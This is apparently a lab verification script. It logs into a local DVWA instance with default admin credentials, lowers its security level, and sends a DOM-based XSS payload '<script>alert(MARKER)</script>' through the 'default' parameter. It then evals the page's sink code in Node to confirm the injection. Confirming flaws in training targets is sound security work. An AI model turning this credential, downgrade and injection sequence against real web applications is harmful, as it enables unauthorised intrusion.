#!/bin/bash
MARKER=$1
BASE='http://172.17.0.1:3100'
COOKIE='/tmp/domx_cookies.txt'
rm -f $COOKIE
curl -s -L -c $COOKIE $BASE/login.php -o /tmp/domx_login.html
TOKEN=$(grep -o 'user_token[^>]*' /tmp/domx_login.html | grep -o "value='[^']*'" | head -1 | cut -d"'" -f2)
curl -s -L -b $COOKIE -c $COOKIE -d 'username=admin&password=password&Login=Login&user_token='$TOKEN $BASE/login.php -o /tmp/domx_logged.html
echo 'LOGIN_LOGOUT_COUNT: '$(grep -c Logout /tmp/domx_logged.html)
curl -s -L -b $COOKIE $BASE/security.php -o /tmp/domx_sec.html
STOKEN=$(grep -o 'user_token[^>]*' /tmp/domx_sec.html | grep -o "value='[^']*'" | head -1 | cut -d"'" -f2)
curl -s -L -b $COOKIE -c $COOKIE -d 'security=low&seclevelf=Submit&user_token='$STOKEN $BASE/security.php -o /tmp/domx_sec2.html
PAYLOAD='%3Cscript%3Ealert('$MARKER')%3C/script%3E'
URL=$BASE'/vulnerabilities/xss_d/?default='$PAYLOAD
curl -s -L -b $COOKIE $URL -o /tmp/domx_page.html -w 'PAGE_HTTP: %{http_code}\n'
SINK=$(grep -F 'decodeURI(lang)' /tmp/domx_page.html | head -1 | sed 's/^ *//')
echo 'SINK_LINE: '$SINK
PAGE_FILE=/tmp/domx_page.html PAGE_URL=$URL node - > /tmp/domx_node_out.txt << 'NODEEOF'
const fs=require('fs');
const page=fs.readFileSync(process.env.PAGE_FILE,'utf8');
const href=process.env.PAGE_URL;
const lines=page.split(String.fromCharCode(10));
let start=-1;
let end=-1;
const needle='if (document.location.href.indexOf('+String.fromCharCode(34)+'default='+String.fromCharCode(34)+')';
for(let i=0;i<lines.length;i++){if(lines[i].indexOf(needle)>=0){start=i;}}
if(start<0){console.log('SINK_NOT_FOUND');process.exit(1);}
for(let i=start+1;i<lines.length;i++){if(lines[i].trim()==='}'){end=i;break;}}
if(end<0){console.log('SINK_NOT_FOUND');process.exit(1);}
const block=lines.slice(start,end+1).join(String.fromCharCode(10));
const outs=[];
const document={location:{href:href},write:function(s){outs.push(s);}};
eval(block);
outs.forEach(function(s){console.log('DOM_WRITE: '+s);});
NODEEOF
cat /tmp/domx_node_out.txt
if grep -F -q '<script>alert('$MARKER')</script>' /tmp/domx_node_out.txt; then
echo 'INJECTED_SCRIPT: <script>alert('$MARKER')</script>'
echo 'EVIDENCE: attacker-controlled default value written to the DOM via document.write and decoded with decodeURI, injecting a script element'
echo 'VERDICT: CONFIRMED'
else
echo 'VERDICT: FAILED'
fi
